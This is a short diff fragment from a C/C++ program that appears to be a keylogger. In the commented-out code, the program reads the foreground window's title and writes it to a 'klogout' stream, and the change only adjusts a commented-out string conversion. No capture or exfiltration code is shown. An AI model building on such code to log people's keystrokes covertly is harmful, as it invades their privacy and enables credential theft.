@@ -57,7 +57,8 @@ int main(int argc, char *argv[]){
 //		HWND hwndHandle = GetForegroundWindow();
 //		GetWindowText(hwndHandle, title_wchar, 1023);
 //
-//		memcpy(title, title_wchar, 1024); // title_wchar do title
+//		//memcpy(title, title_wchar, 1024); // title_wchar do title
+		//wcstombs(title, title_wchar, 1024);
 //
 //		if(lastTitle != title){
 //			klogout << endl << endl << "Window: ";
